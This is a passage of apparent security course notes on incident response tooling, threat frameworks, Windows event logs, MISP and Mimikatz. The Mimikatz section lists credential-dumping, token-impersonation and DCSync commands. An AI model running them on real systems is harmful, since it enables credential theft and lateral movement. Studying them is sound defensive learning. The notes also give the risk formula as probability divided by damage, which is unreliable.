  [
    Artifacts can then be ran on individual clients. The results of that artifact will be displayed in a Velociraptor
    notebook.

    The example query on the right gets information about the current host with
    #underline(link("https://docs.velociraptor.app/vql_reference/popular/info/")[`info()`])
    on Windows, Linux and macOS machines.

    *Example Artifacts:* Check if anomalous file exists, check executed shell commands, extract browser history,
    extract network traffic, recover deleted files, `KapeFiles` for quick triage
  ],
  [
    ```yaml
    name: Custom.Artifact.Name
    description: Human readable description
    type: CLIENT
    parameters:
       - name: FirstParameter
         default: Default Value of first parameter
    sources:
      - name: MySource
        precondition: |
          SELECT OS From info() where OS = 'windows'
          OR OS = 'linux' OR OS = 'darwin'
        query: SELECT * FROM info() LIMIT 10
    ```
  ],
)

Some artifacts allow you to use YARA. However, it is relatively expensive. Consider using more targeted glob expressions
and client-side throttling since YARA scanning is usually not time-critical.

== Hunting
A hunt runs the same artifacts on a entire fleet of machines. Hunts can be restricted by OS and labels on the clients.
Once a hunt has been created, it needs to be manually started. Only systems currently online will participate in the
hunt and send results back to the Velociraptor server. Systems currently offline will execute the artifacts when they
come back online. The results of the hunts will be aggregated into a Velociraptor notebook.

_Notebooks_ in Velociraptor show results from artifacts and hunts. The data can also be modified and custom VQL queries
can be added.

A system that has a suspected infection can be _contained_. This will cut any network traffic of the machine except to
the Velociraptor server. It is also assigned the "Quarantined" label.

= Cyber Frameworks
#v(-0.75em)
== Cyber Kill Chain
The Cyber Kill Chain, developed by Lockheed Martin and published in 2011, was the first widely used cyber security model.
While the original version was timeline-based, the improved model is circular. It is a series of eight phases that an
attacker performs, which defenders can trace. By implementing security controls at each phase, the chain can be broken
and the attack stopped.

#grid(
  columns: (1.4fr, 1fr),
  align: horizon,
  [
    - _Reconnaissance:_ Attackers typically assess the situation from the outside-in, to identify targets and tactics
      for the attack
    - _Intrusion:_ Based on the reconnaissance, the attackers get into your systems; often leveraging malware or security
      vulnerabilities
    - _Exploitation:_ Exploiting vulnerabilities, delivering malicious code onto the system to get a better foothold
    - _Privilege Escalation:_ Usually higher privileges are required for sensitive data, persistence and lateral
      movement.
    - _Lateral Movement:_ Move to other systems in the network to gain more data, more powerful accounts
    - _Obfuscation/Anti-forensics:_ Covering their tracks with false trails, compromised data and deleting logs to
      confuse and slow down forensic teams
    - _Denial of Service:_ Disruption of normal access for users and system to stop the attack from being
      monitored/tracked/blocked
    - _Exfiltration:_ Getting data out of the system
  ],
  image("img/cyber-kill-chain.png"),
)

*Criticisms of the Cyber Kill Chain*
- Not every phase is performed inside a victim network. These actions are more difficult to detect
- Internal attackers are more difficult to detect
- The chain represents a series, in reality attackers can do different orders or things in parallel
- Lack of descriptions for detection rules, little community effort around it

== Diamond Model
#grid(
  [
    Developed by the Center for Cyber Intelligence Analysis and Threat Research (CCIATR) in 2013.
    It is designed to help with analyzing cyber intrusions and focuses more on the relationships between
    different elements.

    It consists of four basic components:
    - _Adversary:_ Name, origin, motivation, description
    - _Infrastructure:_ IP addresses, malware, email addresses
    - _Victim:_ Location, vertical, goal, person, organization
    - _Capability:_ Method, targets, operational manual, malware

    Additionally, the diamond model focuses on the relationship between those components:

  ],
  image("img/diamond-model.png"),
)
#v(-0.5em)
- _Adversary-Victim:_ Attacker's motivation and objectives to target this specific victim
- _Adversary-Infrastructure:_ How the attacker establishes and maintains their operations
- _Victim-Infrastructure:_ How the attacker uses the victim's infrastructure in the attack
- _Victim-Capability:_ Tactics used against the victim

An adversary deploys a capability over some infrastructure against a victim. These activities are called _events_.
Events are phase-ordered by adversary-victim pair into activity threads representing the flow an adversary's
operations.

== STIX & TAXII
_Structured Threat Information Expression (STIX)_ and _Trusted Automated Exchange of Intelligence Information (TAXII)_
are standards to improve the prevention and mitigation of cyber attacks. They were developed by MITRE, OASIS Cyber
Threat Intelligence and the US Department of Homeland Security in 2017. _STIX describes the "what"_ of threat
intelligence, while _TAXII defines "how"_ that information is relayed. Both standards have machine-readable output and
can better share information between parties.

STIX _describes cyber threat information_ like Motivation, Abilities, Capabilities and Response in a JSON-based format.
It is the notation used for MISP.

There are 18 types of objects representable by STIX. The most important ones are:
- _Indicator:_ Name, description and a pattern to search for. Either a STIX or YARA pattern
- _Malware:_ Name, description, type of malware, phases of kill chain used
- _Relationship:_ Source #hinweis[(indicator)] and target #hinweis[(malware)]

TAXII is used to _exchange intelligence information_ with other parties.

Four different services are offered to the users:
- _Discovery:_ A way to learn what services an entity supports and how to interact with them
- _Collection Management:_ A way to learn about and request subscriptions to data collections
- _Inbox:_ A way to receive content #hinweis[(push messaging)]
- _Poll:_ A way to request content #hinweis[(pull messaging)]

MISP uses STIX and TAXII to share information with other parties, see chapter @misp.

#pagebreak()

== MITRE ATT&CK
_Adversarial Tactics, Techniques & Common Knowledge (ATT&CK)_ is a framework to document common _tactics, techniques and
procedures (TTPs)_ that APTs use against Windows enterprise networks. It is based on real-life observations
#hinweis[(published reports)] and attributions #hinweis[(by anti-virus vendors)]. Useful for red & blue teams to
understand an attack.

Each TTP is grouped into a column that roughly matches with the steps of the Cyber Kill Chain.
#v(-1em)
#align(center, image("img/mitre-attack.png", width: 95%))
#v(-0.5em)

#table(
  columns: (auto, 1fr, 0.5fr),
  table.header([Terminology], [Description], [Example]),
  [*Matrices*], [Scenarios of ATT&CK with different Tactics and Techniques], [Enterprise, Mobile, ICS],

  [*Tactics (TA)*],
  [
    Tactics represent the "why" an attacker is performing an action. For example, an adversary needs valid credentials
    to login into the protected system.
  ],
  [
    - TA0001 Initial Access
    - TA0003 Persistence
    - TA0008 Lateral Movement
  ],

  [*Techniques (T)*],
  [
    Techniques represent "how" an adversary achieves a tactical goal by performing an action. For example, an adversary
    may dump credentials to achieve credential access.
  ],
  [
    - T1659 Content Injection
    - T1189 Drive-by
    - T1190 Exploit Public Apps
  ],

  [*Sub-techniques\ (Txxxx.xxx)*],
  [Refinements or more specific manifestations of the main techniques],
  ["Credential Access" turns into "Steal/Forge Kerberos Tickets"],

  [*Groups (G)*],
  [Hacking groups that perform attacks. Additional info like place of origin and motivation if known],
  [APT19, APT32, APT37,\ Bandook],

  [*Mitigations (M)*],
  [Prevent a technique or sub-technique from being successfully executed],
  [Update Software, Password Policies, Data Backup],
)

*Limitations*
- _Not a checklist:_ do not use this as a simple "can we detect this", but understand the attack, translate it into your
  environment, compare to existing controls
- _Not a bingo card:_ do not mark what you can cover
- _Not a way of documenting every possible attack:_ ATT&CK documents the known TTPs: when you document your own
  attacks/campaigns, you realize that you have more information about an attacker than what ATT&CK currently publicly
  describes
- _Static, final list:_ The ATT&CK matrices are improved or modified regularly and now include PRE-ATT&CK (preparation
  attackers perform), Mobile devices and industrial control systems (ICS)

*Comparison ATT&CK vs. Cyber Kill Chain*\
ATT&CK allows you to show the lifecycle/progress of an attack inside your enterprise. The kill chain is more linear,
while ATT&CK is more graph-like: you can move left to right, but also up and down within the tactics.

== Vectr
Vectr is a tool for APT emulation, based on MITRE ATT&CK. It can be used by red teams to launch an attack similar to
existing APTs. Select the TTP and generate attack paths. The results can be tracked and thus show the improvements of
the blue team. It also provides test cases and detection rules.


= Red & Blue Teaming
#image("img/defense-tactics.png")

== Pentesting
Pentesting involves testing the security of an IT infrastructure by attacking it. The customer needs to explicitly hire
pentesters and allow these attacks. They also specify the scope of the attacks #hinweis[(Web App, E-banking, Remote
  Access, Kubernetes, AWS...)] through _threat modelling_.

The Pentester is testing the systems without trying to hide their activities. They send emails announcing the start and
stop of the pentest, but these may only be sent to the CTO and not the security team. After the attack is done, the
pentesters write a report about their findings and present them to the customer.

There are two ways of pentesting:
- _Whitebox:_ The pentester receives information from the company, like login credentials, source code etc.
- _Blackbox:_ The pentester has no previous information about the target and must figure out everything themselves

After the report has been passed over to the customer, the customer makes a risk assessment. It is usually expressed as
the following formula:

$ "Risk" = "Probability" / "Damage" $

== Blue Team
The blue team is the IT defense department within a company, usually a Security Operations Center (SOC).
They are responsible for smooth operations of the company, defending from attacks.

== Red Team
A deliberately set-up team by the company to attack their own infrastructure. The goal is to simulate an attack as
closely as possible without disrupting daily business. It is a complete, multi-level simulation of an attack on an
enterprise that _focuses on achieving specific attack goals_, may emulate a specific threat actor and, is designed to
measure how well a company's people and processes, infrastructure and (physical) security controls can withstand an
attack from a real-life adversary

The red team creates a journal of when they attacked what, while the blue team creates a journal of when they defended
against what. The Blue Team has _no knowledge of when or what attacks will happen_. By comparing the journals after the
attack is done, possible weaknesses in the blue team can be found.

*Goals of Red Teaming*
#v(-0.5em)
#grid(
  [
    - Assess a company's security posture and operation as a whole (end-to-end)
    - Test and improve a company's reaction to an attack
  ],
  [
    - Verify a company's capabilities to protect its crucial assets
    - Improve blue team skills and overall security posture
  ],
)

*Red Teaming Activities*
#v(-0.5em)
#grid(
  [
    - Perform OSINT & _gain initial access_ to the company infrastructure
      #sym.arrow Identify entry points from an outside attacker's perspective
    - _Establish persistence_, perform information gathering and reconnaissance
      #sym.arrow Identify weaknesses in endpoints and where valuable information can be collected
    - _Compromise crucial assets_ ans complete goals
      #sym.arrow Identify issues in protection measures of critical assets
  ],
  [
    - _Escalate privileges and move laterally_
      #sym.arrow Identify and exploit issues in privilege management and zoning/segregation measures
    - _Workshop with Blue Team_
      #sym.arrow Identify gaps, weak points, issues in detection & response capabilities and processes
  ],
)

== Purple Team
Purple teaming is a co-operative testing methodology _between red and blue teams_. It consists of simulations of
malicious attacks and activities and aims to identify misconfigurations and coverage gaps in existing security controls.
Purple Teaming works in the continuous cycle of _assessing defenses_, _measuring coverages_ and _tuning defenses_.

*Goals of Purple Teaming*
- Verify functionality of implemented use cases and associated processes
- Evaluate quality and goal of the implemented use cases and associated processes
- Coverage analysis based on Tactics, Techniques and Procedures (TTPs) from MITRE ATT&CK
- Assess the quality and maturity of processes and organization
- Assess the quality of logged information and communication

*Purple Teaming Activities*
#v(-0.5em)
#grid(
  [
    - _Review implemented concepts_, processes and organization
      #sym.arrow Identify conceptual issues
    - _Perform specific attacks_ to test implemented use cases and processes
      #sym.arrow Verify if a given use case works as intended
    - _Perform attack variations_ for implemented use cases
      #sym.arrow Verify if detection can easily be bypassed

  ],
  [
    - Perform additional attacks to _test coverage/gaps of use cases_
      #sym.arrow Verify if crucial security controls are missing
    - _Review provided logs/alerts/communication_
      #sym.arrow Verify if the provided information is adequate for further processing

  ],
)

*Comparison*
#v(-0.75em)
#table(
  columns: (1fr, 1fr),
  table.header([Red Teaming], [Purple Teaming]),
  [
    - Red vs. Blue (during the attack)
    - One-shot attack simulation (from A to Z)
    - Attack activities based on missions
    - Focuses only on detection capabilities involved with the assigned mission
  ],
  [
    - Red & Blue work together
    - Continuous testing cycle
    - Attack activities based on use cases
    - Focuses on all/most implemented detection capabilities
  ],
)

#pagebreak()

= Windows Event Logs
Windows stores its logs in the proprietary binary _EVTX format_ at `%WINDIR%\Systen32\winevt\Logs`
#hinweis[(but the location can be changed in the Registry:
  `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog`)].
The _logged events depend on the configuration_, which is usually done via Group Policies of Active Directory or MDM.
Each log has a maximum file size #hinweis[(default 20MB)].
There are three options when the maximum size has been reached:
- _Overwrite:_ Old events are overwritten. Manually rotate the ones you want to keep out
- _Archive:_ Rename the logs to something else
- _Do Nothing:_ Event logs remains full and no further events are logged

#table(
  columns: (auto, 1fr),
  table.header([Log Name], [Description]),
  [*`Security.evtx`*],
  [
    Access Control and security information. Only written to by `lsass.exe` and only readable by Admin accounts.
    The most important log for forensics
  ],

  [*`System.evtx`*], [Windows system events #hinweis[(drivers, services, resources)]],
  [*`Application.evtx`*], [Non-system related software events],
  [*`<Custom>.evtx`*],
  [Around 150 different custom application logs #hinweis[(RDP, PowerShell, Firewall)]. Big chances of retaining logs
    longer than `Security`],
)

The event log files are _usually locked_ when the system is running, but they can be accessed via various tools:
Exporting from the Event Viewer, PowerShell via `Get-WinEvent` or external tools like PsLogList, EvtxCmd, EvtxExplorer.
_Hayabusa_ is a event log timeline generator that detects known bad behavior in event logs

== LSASS <lsass>
_Local Security Authority Subsystem Service (LSASS)_ is a process in Windows that is responsible for _enforcing the
security policy_ on the system. It verifies users logging on to a Windows computer or server, handles password changes,
and creates access tokens. `lsass.exe` is a Windows process that takes care of security policy for the OS.
For example, when you logon to a Windows user account or server, `lsass.exe` verifies the logon name and password.
If you terminate `lsass.exe` you will probably find yourself logged out of Windows.

`lsass.exe` also writes to the Windows Security Log so you can search there for failed authentication attempts along
with other security policy issues. To secure LSASS, enable protections such as Credential Guard
#hinweis[(see chapter @credential-guard)], run LSASS as a Protected Process Light (PPL), restrict administrative access,
and monitor for suspicious access or memory dumping attempts.

== Security.evtx
LSASS logs the following events to `Security.evtx`
#v(-0.5em)
#grid(
  [
    - System Events #hinweis[(System start, shutdown)]
    - Logon Events #hinweis[(User logging on or off (stored on authorized system))]
    - Account Logon #hinweis[(Recorded on the authorizing system (Domain Controller usually))]
    - Privilege Use #hinweis[(User Account exercising a privilege)]
  ],
  [
    - Account Management #hinweis[(Modifications of accounts)]
    - Object Access #hinweis[(System Access Control List (SACL) based objects (files / folders / registry...))]
    - Directory Service #hinweis[(AD Object with SACL accessed)]
    - Process Tracking #hinweis[(Process start, exit, ...)]
  ],
)

*Careful!* _A Logon Event does not necessarily mean a Logon by a user account!_

#table(
  columns: (auto, 1fr),
  table.header([Event ID], [Description]),
  [*1102*], [Event deleted from Event Log],
  [*4624*], [Successful Logon. Includes the logon type, see table below],
  [*4625*], [Failed Logon],
  [*4624 / 4647 / 4634*], [Successful Logoff],
  [*4648*],
  [Logon with explicit credentials #hinweis[(Run Program as different user, `RunAs`, `PsExec`, RDP with NLA)]],

  [*4672*], [Special privileges assigned to new logon],
  [*4688*], [Process created #hinweis[(not logged by default)]],
  [*4697*], [New service created],
  [*4698*], [Scheduled Task created],
  [*4700*], [Scheduled Task enabled],
  [*4720*], [Account Creation],
  [*4728 / 4732 / 4756*], [Member was added to security group],
  [*4738*], [A user account was changed. Permissions were granted or similar],
  [*4776*], [Local account authentication with NTLM],
  [*4779*], [A user disconnected a terminal server session without logging off],
  [*5145 / 5140*], [Accessing file share],
  [*5156*], [Windows Firewall network connection],
)

=== Logon Types
#table(
  columns: (auto, auto, 1fr),
  table.header([Logon Type], [Name], [Description]),
  [*2*], [_Interactive_], [Logon with keyboard and screen of system],
  [*3*], [_Network_], [Connection to shared folder on this computer from elsewhere on network],
  [*4*], [_Batch_], [Scheduled task running as the specified user],
  [*5*], [_Service_], [Service startup running as the specified user],
  [*7*], [_Unlock_], [Unattended workstation with password protected screen saver],
  [*8*],
  [_NetworkCleartext_],
  [
    Logon with credentials sent in the clear text. Most often indicates a logon to IIS
    #hinweis[(Internet Information Service, built-in web server)] with basic authentication.
  ],

  [*9*],
  [_NewCredentials_],
  [
    Logon with RunAs or mapping a network drive with alternate credentials.
    #hinweis[("A caller cloned its current token and specified new credentials for outbound connections.
      The new logon session has the same local identity but uses different credentials for other network connections.")]
  ],

  [*10*], [_RemoteInteractive_], [Terminal Services, Remote Desktop or Remote Assistance],
  [*11*],
  [_CachedInteractive_],
  [Logon with cached domain credentials such as when logging on to a laptop when away from the network],
)

== System.evtx
#table(
  columns: (auto, 1fr),
  table.header([Event ID], [Description]),
  [*10000*], [Driver of USB device is being installed #hinweis[(DriverFramework-Usermode)]],
  [*10100*], [Driver installation of USB device has succeeded #hinweis[(DriverFramework-Usermode)]],
  [*20001*], [Device installation #hinweis[(User Plug-n-Play Device Event)]],
)


== Application Logs
#table(
  columns: (auto, 1fr),
  table.header([Log ID], [Description]),
  [*4103*], [PowerShell Module/Pipeline logging],
  [*4104*], [PowerShell Script Block logging],
)

#pagebreak()

=== PowerShell Logs
PowerShell activity is logged in two different locations in the Event Logs:
_Windows PowerShell_ #hinweis[(`Windows PowerShell.evtx`)] and
_Microsoft\\Windows\\PowerShell\\Operational_ #hinweis[(`Microsoft-Windows-PowerShell%4Operational.evtx`)]

PowerShell 5 and later have automatic logging of suspicious scripts. It shows what has been executed, but malware is
often obfuscated. The used version can be manually downgraded with `powershell -Version 3.0`

PowerShell also logs outside of the event log: _PSReadline_ records the last 4096 commands into
`%appdata%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. The _transcript logs_ record all input and
output from PowerShell. Transcript logging is disabled by default and needs to be enabled with GPO or `Start-Transcript`.
Per default, it writes to `%userprofile%\Documents`.

== Active Directory Logging
The _Active Directory domain controller_ logs all authentication attempts in the domain.
See chapter @kerberos for details of Kerberos terminology.

#table(
  columns: (auto, 1fr),
  table.header([Log ID], [Description]),
  [*4768*], [TGT was granted, successful login],
  [*4769*], [TGS was requested, service access successful],
  [*4771*], [Kerberos Pre-Authentication failed],
  [*4776*], [Account Authentication with NTLM (Success or Failure)],
)

The _authenticating system_ als produces their own logs
#table(
  columns: (auto, 1fr),
  table.header([Log ID], [Description]),
  [*4768*], [Kerberos TGT requested (Success or Failure)],
  [*4769*], [Kerberos ST requested (Success or Failure)],
  [*4771*], [Kerberos Pre-Authentication failed],
  [*4776*],
  [
    NTLM: Domain Controller validated credentials (Success or Failure)
    #hinweis[(Suspicious, especially when observed on a workstation)]
  ],
)

== Auditing with logs
Process creation is not logged by default, it must be enabled with a Group Policy
#hinweis[(Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy\\Configuration\\
  System Audit Policies\\Detailed Tracking)]. Every process will then create a _4688 A new process has been created_ log.
It shows the executable run, the command line, the parent process and the user who ran it.

In the `Microsoft-Windows-NTFS%4Operational.evtx` log, the _event 142_ shows the free storage on the drives and the
storage change since the last time event 142 was logged.

Deleting event logs results in a new event: _1102 The audit log was cleared_. But there are tools to allow clearing logs
without triggering a 1102, like Mimikatz.

A surge of _4625 Failed Login_ events indicates a brute force attack on the machine.

A good IoC is _4720 Account Creation_ when a malware creates a new user account for persistence. These events are
relatively uncommon and thus easy to monitor for. Related events are _4728 / 4732 / 4756_ when a user gets added to a
group.

*Example for Lateral Movement:* 4624 / 4672 #hinweis[(Logon)] $->$ 5145 / 5140 #hinweis[(Access file share)] $->$
4697 / 7045 #hinweis[(Service Lookup & Creation)]. This happened due to an automatic attack via Metasploit.

#pagebreak()

=== User Rights Enumeration
Which domain user has what permissions on which system? _SharpHound_ will try to enumerate local group membership
on the target systems by querying the _Windows Security Account Manager (SAM) database_ remotely via
_SAM Remote Protocol_ #hinweis[(RPC over port 445)]. All authenticated users have access to SAM on
Domain Controllers (DC) and Read-Only Domain Controllers (RODC). However, the local SAM database of
the DC itself isn't normally used!

#table(
  columns: (auto, 1fr),
  table.header([Log ID], [Description]),
  [*5145*], [A network share object was checked to see whether client can be granted desired access],
  [*4789*], [A user's local group membership was enumerated #hinweis[(List groups of user)]],
  [*4799*], [A security-enabled local group membership was enumerated #hinweis[(List members of group)]],
)

== Sysmon <sysmon>
#grid(
  [
    Sysmon is a Windows system monitoring tool and part of the Microsoft Sysinternals suite.
    It can provide additional Windows Event logs about the happenings on the system.
    Sysmon installs a service to persist across reboots.

    Sysmon has an extensive filtering system: white- or blacklist events, filter network ports, process names or driver
    signatures.

    Sysmon can be combined with SIGMA to _generate Events for SIEM solutions_, see chapter “SIGMA” (Page 54).
  ],
  table(
    columns: (auto, 1fr),
    table.header([ID], [Description]),
    [*1*], [Process creation],
    [*2*], [A process changed file creation time],
    [*3*], [Network connection #hinweis[(All TCP/UDP connections)]],
    [*4*], [Sysmon service state changed #hinweis[(Service started/stopped)]],
    [*5*], [Process terminated],
    [*6*], [Driver loaded],
    [*7*], [Image loaded #hinweis[(Module is loaded in a process)]],
    [*11*], [File created],
    [*12*], [Registry event #hinweis[(Create/Delete)]],
  ),
)


= MISP <misp>
Threat intelligence sharing matters. Cyber Security is a team sport. Bad Guys share information, expertise and code.
The good guys are left behind. Collaboration between individuals and organizations becomes increasingly important.
Some platforms share their knowledge freely, so called _Open Source Intelligence (OSINT)_.

_Malware Information Sharing Platform (MISP)_ is a threat intelligence platform for gathering, sharing, storing and
correlating Indicators of Compromise. Developed by the Computer Incident Response Center in Luxemburg.
By _hosting your own MISP instances_ you can receive and share this information from/with 6000 organizations worldwide.
It is the software that distributes STIX via TAXII. Makes it easier to import data into your SIEM.

*Types of data exchanged:* Threat intelligence, IoCs, targeted malware and attacks, financial fraud...

MISP has various standards:
- _Core Format:_ Exchanges indicators and threat information between MISP instances
- _Object Template Format:_ The JSON template to construct MISP objects
- _Taxonomy Format:_ JSON format to represent machine-readable tags
- _Galaxy Format:_ Galaxies and Clusters that group MISP events and attributes
- _SightingDB Format:_ Automated context for a given attributes by counting occurrences and tracking times of
  observability


== Events
#align(center, image("img/misp-overview.png", width: 75%))
Events in MISP capture contextually related information represented as attributes and object.
Used to store and share malware data and IoCs in a structured way using STIX.
Always belong to one organization, but can be shared to other MISP instances.

An event contains:
#v(-0.5em)
#grid(
  [
    - _Date:_ When the event occured
    - _Threat Level:_ High, medium, low, undefined
    - _Analysis:_ State of event analysis #hinweis[(Initial, ongoing, complete)]
  ],
  [
    - _Distribution:_ How the event is shared to other MISP instances
    - _Extends Event:_ Groups related events
  ],
)

*Other MISP concepts related to Events*
#v(-0.5em)
#table(
  columns: (auto, 1fr),
  table.header([Concept], [Description]),
  [*Attribute*],
  [
    Describe a MISP event, like network indicators #hinweis[(IP address, domains)],
    system indicators #hinweis[(String in memory)], bank account details...
  ],

  [*Sightings*],
  [
    A score on attributes that describe how many times this attribute was spotted in the wild.
    False positives can also be reported here. Can have an optional expiry date for the attribute itself.
  ],

  [*Object*],
  [
    Group attributes together #hinweis[(Person object $->$ Last name, first name, portrait, address...)].
    Should be preferred over single attributes.
  ],

  [*Category*],
  [
    General groupings what the malware does and affects
    #hinweis[(Financial fraud, Network activity, payload installation, person)]
  ],

  [*Type*],
  [
    Specific labels to describe what kind of data is affected by the malware
    #hinweis[(Bitcoin address, email body, telephone number, cookie...)]
  ],

  [*Attachment*],
  [
    File Attachments can be added to events. These are also categorized #hinweis[(Antivirus detection, Payload delivery,
      Artifacts dropped, Network activity (e.g. a PCAP file), External analysis, Support tool)].
    Adding an attachment will usually generate more attributes #hinweis[(Filename, filehash, size...)]
  ],

  [*Free text*],
  [
    Allows arbitrary text on a event. If it is a known text format, it will be automatically detected and parsed.
    Examples are a list of IP addresses, a email in EML format, log files... For more complex imports, _templates_ are
    available.
  ],

  [*Taxonomies*],
  [
    Further classification can be done with Taxonomies. Events, Attributes and Objects can have Taxonomies entries
    applied to them to describe their reliability, secrecy etc. Usually used to determine which attributes are allowed
    to be shared. *Examples:* Traffic Light Protocol, Admiralty Scale
  ],

  [*Event\ Reports*],
  [
    Text that describes the entire event. Either added manually or automatically generated Markdown from the existing
    attributes/objects.
  ],

  [*Proposal*],
  [
    Propose a change on an event, attribute or object. The owner of the event gets notified and can approve or discard
    the proposal.
  ],
)

== Evaluation
_Correlation Graphs_ show the event flow to visualize all events and show _correlations_ between events and attributes.
Some correlations are automatically generated by MISP #hinweis[(Matching file hash, matching email address, matching IPs)]

_Clusters_ group events together. _Galaxies_ can be used to group a clusters of objects together.
Can be attached to events or attributes. The elements inside a cluster are expressed as key-value pairs.
*Example:* The MITRE ATT&CK galaxy contains a cluster for each attack type.
Within that cluster are elements such as links to other references.

_Warning Lists_ are lists of well known indicators that can be associated to _potential false positives_, errors or mistakes.

_Notice Lists_ inform MISP users of _legal implications_, _privacy implications_, _policy implications_ and
_technical implications_ of using specific attributes, categories or objects. *Example:* GDPR information.

== Sharing
_Feeds_ easily import any remote or local URL to store the data in your MISP instance at regular intervals.
Can be in the MISP format, CSV or free text. MISP itself supplies a list of open-source feeds.
Caching the feed content to the Redis server allows correlating attributes and see matching "Feed hits".

Each user belongs to a MISP organization. The site admin manages the organizations. Only local organizations can access
the instance. Data can be distributed later between organizations. Each MISP user can be granted _roles_ with different
permissions. Usually, there is a separate sync user for synching with other MISP users.

An event can have one of five _distribution levels_:
#v(-0.5em)
#grid(
  [
    - Your organization only
    - This community only #hinweis[(All organizations on this instance)]
    - Connected communities #hinweis[(All synced communities)]
  ],
  [
    - All communities
    - Sharing group
  ],
)

A _Sync Server_ is a MISP instance you want to sync with. Only the admin is able to add new ones. API credentials of the
sync user are required to add it.

Syncing between MISP instances can happen in two modes:
- _Push:_ Syncs immediately after publication of the event. May not work due to connection issues or dead workers
  Does not sync data set to "Your organization only" or "This community only".
- _Pull:_ Only performed on command #hinweis[(manual trigger, cron job)].
  Also fetches objects set to "Your organization only" or "This community only"

Additional syncing rules can be set, like allowed/blocked tags, allowed/blocked organizations...

_Sharing Groups_ are a more granular way to create re-usable distribution lists for events/attributes. They can include
organizations from your own instance or (in-)directly connected instances. A sharing group can be created by any user
that has the sharing group editor permission.


= Mimikatz
Mimikatz is the defacto post-exploitation program to extract and manipulate Windows credentials. Running it requires
local admin privileges. It retrieves credentials from LSASS memory #hinweis[(see chapter @lsass)] or from Security
Accounts Manager (SAM) files. If it finds NTLM hashes or Kerberos tickets, they can be used for _pass-the-hash or
pass-the-ticket attacks_ or to create a _golden ticket_.

#v(-0.5em)
#table(
  columns: (auto, 1fr),
  table.header([Command], [Description]),
  [*`::`*], [List all parent modules],
  [*`<module>::`*], [List submodules for a given parent],
  [*`token::elevate`*\ or\ *`priviledge::debug`*],
  [
    Many Mimikatz modules require `SeDebugPrivilege` to use. Both of these commands can acquire them, if Mimikatz is
    running under an Administrator account and runs elevated.
  ],

  [*`lsadump::`*],
  [
    Interact with the local security authority (LSA) to extract local credentials with `lsadump::sam`.
    Requires `SeDebugPrivilege`.
  ],

  [*`sekurlsa::logonpasswords`*], [Interact with LSASS to dump credentials. Requires `SeDebugPrivilege`.],
  [*`sekurlsa::minidump <dmp>`*],
  [
    Interacting with LSASS memory will alert any anti-virus program. This command lets you obtain LSASS data
    through a memory dump of LSASS from Task Manager or `procdump` and load it into Mimikatz.
  ],
)

== Windows Credential Management
Windows Credentials are managed through multiple steps.
#definition[`Thread/Process -> Token -> Logon Session -> Auth Package -> Credential`]

#grid(
  [
    _Tokens_ are the current security context of a process/thread. If a thread wants to _act in the name of a user_,
    it uses a token. Tokens are _tied to a logon session_ and determine how the credential is used.
  ],
  image("img/windows-cred-token.png"),
  [
    Windows creates a _logon session_ upon successful authentication. User credentials are stored in `lsass.exe`
    The credentials are tied to _authentication packages_ inside the logon session #hinweis[(e.g. NTLM hashes,
      Kerberos tickets/keys, passwords in plaintext)].

    The OS can use the user credentials in LSASS to perform Single-Sign-On.
  ],
  image("img/windows-cred-session.png"),
)






There are different session types:
- _Network Logon (Type 3):_ Clients prove that they have the credentials, but don't send them
  #hinweis[(NTLM challenge/response aka. pass-the-hash)]. If a user logged in this way, there are no credentials to steal.
- _Non-Network logons #hinweis[(Interactive/NetworkCleartext)]:_ The credentials are sent to the server and therefore
  stored in LSASS #hinweis[(RDP interactive logon)]

=== The Double-Hop Problem
Tokens tied to the Network Logon Sessions can't be used for lateral movement because they don't cache credentials.
When you remotely execute code with WMI or WinRM, you'll receive a token that is tied to a Network Logon session.
It is impossible to _"double-hop"_ and authenticate to other resources in the network from this compromised host.

*Workarounds*
- _Use another token pointing to a non-network logon session_ by stealing another token or injecting into another
  process.
- _Create a new token pointing to a non-network logon session_ by using stolen credentials
- _Load credentials into current session_ with pass-the-ticket

#pagebreak()

=== Token types & impersonation
#table(
  columns: (auto, 1fr),
  table.header([Token], [Description]),
  [*Primary Tokens*],
  [
    A process token. Uses the security context of user account associated with the process
  ],

  [*Impersonation\ Tokens*],
  [
    A thread token. Used to impersonate other tokens in the client/server scenarios, depending on the _impersonation
    level_ the OS might use the token's credentials to authenticate remotely.
  ],
)
#v(-0.5em)
*Impersonation Levels*
- _Anonymous:_ Remote server can't identify a client, the thread acts as a anonymous user
- _Identification:_ Remote server can identify the user, but not impersonate them
- _Impersonation:_ Remote server can identify and impersonate the client across one computer boundary
- _Delegation:_ Remote server can impersonate client across multiple boundaries and make calls on behalf
  #hinweis[("double-hop")]

Stolen impersonation tokens with "Anonymous" or "Identification" level can't be used for remote authentication.
Tokens with "Impersonation" or "Delegation" level might work, if the logon session has credentials in it.

=== Using Mimikatz to obtain credentials
Mimikatz can interact with process and thread tokens. The `token::` module enables interaction with authentication
tokens, including grabbing and impersonating existing tokens
#table(
  columns: (auto, 1fr),
  table.header([Command], [Description]),
  [*`token::list`*], [Lists all tokens of the system. Can be used to find an admin token],
  [*`token::elevate /id:<tokenId>`*], [Impersonates a token, by default elevating to `SYSTEM`],
)

For each logon session, Mimikatz enumerates the credentials in each authentication package.

== DCSync
DCSync is a late-stage attack to obtain arbitrary user- and machine-credentials #hinweis[(Kerberos keys, NTLM hashes)].
Relies on data replication features between _multiple domain controllers_ using _Microsoft Directory Replication Server
Remote Protocol (MS-DRSR)_. The attack consists of _simulating a domain controller_, which then asks another domain
controller to replicate one or more objects with credentials. Requires specific privileges to execute: By default,
only user in the "Domain Admin" and "Domain Controller" groups are able to perform syncs.

Mimikatz can perform a DCSync attack with a user that has the "Replicate Directory changes" permission on the DC.
```sh
lsadump::dcsync /domain:mydomain.local /user:someuser
```

== Data Protection API <dpapi>
The _Data Protection API (DPAPI)_ on Windows provides a set of API calls #hinweis[(`CryptProtectData`/`CryptUnprotectData`)]
that allow applications to encrypt/decrypt data blobs at rest on the system. It provides applications an easy ways to
securely store secrets on disk without having to worry about key management overhead.

Programs can pass the API a byte array and optional entropy and get encrypted data back.
The keys of each entry are linked to the system or the user and handled automatically by the OS.

*Secrets protected by DPAPI*
#v(-0.5em)
#table(
  columns: (1fr, 1fr),
  table.header([User], [System]),
  [
    - Windows credentials #hinweis[(e.g. for RDP)]
    - Windows vaults
    - Saved logins in browser
    - RDP configurations with passwords
    - Dropbox syncs
  ],
  [
    - Scheduled tasks
    - Azure AD Connect authentication
    - Wi-Fi passwords
